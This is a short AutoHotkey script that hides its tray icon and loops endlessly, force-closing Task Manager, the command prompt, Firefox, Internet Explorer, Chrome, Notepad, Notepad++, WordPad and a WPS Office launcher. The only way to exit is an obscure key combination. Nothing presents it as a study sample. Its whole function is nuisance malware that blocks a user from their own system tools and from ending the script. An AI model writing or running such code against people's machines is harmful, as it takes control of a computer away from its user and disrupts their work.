#NoTrayIcon
#SingleInstance ignore
Loop
{
Process, exist, Taskmgr.exe
Process, close, Taskmgr.exe
Process, exist, cmd.exe
Process, close, cmd.exe
Process, exist, firefox.exe
Process, close, firefox.exe
Process, exist, iexplore.exe
Process, close, iexplore.exe
Process, exist, chrome.exe
Process, close, chrome.exe
Process, exist, notepad.exe
Process, close, notepad.exe
Process, exist, notepad++.exe
Process, close, notepad++.exe
Process, exist, wordpad.exe
Process, close, wordpad.exe
Process, exist, ksolaunch.exe
Process, close, ksolaunch.exe
}
Q & M::ExitApp
return